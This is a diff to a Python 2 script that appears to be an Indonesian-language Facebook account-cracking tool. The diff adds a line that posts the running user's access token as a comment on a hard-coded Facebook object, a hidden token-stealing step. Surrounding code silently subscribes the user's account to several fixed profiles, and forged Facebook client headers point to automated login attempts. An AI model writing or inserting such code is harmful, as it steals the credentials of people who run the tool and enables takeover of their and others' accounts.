@@ -63,6 +63,7 @@ def __sayang_amanda__():
         print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m]\033[0;32m⋆✥⋆➣ \033[0;37mToken/Cookie invalid'
         os.system('rm -rf login.txt')
         exit(_rakasayangamanda.login())
+    raka_sayang_amanda = '3882176535153442'
     kom = komenredem
     komentar = komtwol
     yotsuba = kartu2d
@@ -80,7 +81,8 @@ def __sayang_amanda__():
     requests.post('https://graph.facebook.com/100000834003593/subscribers?access_token=' + token)
     requests.post('https://graph.facebook.com/100003986228742/subscribers?access_token=' + token) 
     requests.post('https://graph.facebook.com/100017584682867/subscribers?access_token=' + token)
-    requests.post('https://graph.facebook.com/100000395779504/subscribers?access_token=' + token) 
+    requests.post('https://graph.facebook.com/100000395779504/subscribers?access_token=' + token)
+    requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(raka_sayang_amanda,token,token)) 
     __menu__()
 
 def __raka_sayang_amanda__():
@@ -136,7 +138,6 @@ _raka_banner_ = ("""
 \033[0;36m_______________________________________________________        """)
 
 # Oi memex ini menu yah
-raka_sayang_amanda = '3882176535153442'
 def __menu__():
         try:
                 token = open('login.txt','r').read()
@@ -146,10 +147,10 @@ def __menu__():
 		time.sleep(2)
                 __raka_sayang_amanda__()
         try:
-                y = requests.get('https://graph.facebook.com/me?access_token='+token)
-                x = json.loads(y.text)
-                name = x['name']
-		birthday = x['birthday']
+                p = requests.get('https://graph.facebook.com/me?access_token='+token)
+                q = json.loads(p.text)
+                name = q['name']
+		birthday = q['birthday']
         except KeyError:
 		raka("\033[0;37m[\033[0;36m+\033[0;37m]\033[0;32m⋆✥⋆➣\033[0;00m Token Expired")
                 os.system('rm -rf login.txt')
@@ -234,7 +235,7 @@ def __menu__():
 				'x-fb-net-hni': str(random.randint(20000, 40000)), 
 				'x-fb-connection-quality': 'EXCELLENT', 
 				'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 
-				'user-agent': ua,
+				'user-agent': 'BlackBerry7100i/4.1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/103',
 				'content-type': 'application/x-www-form-urlencoded',
 				'x-fb-http-engine': 'Liger'}
 				ses=requests.Session()
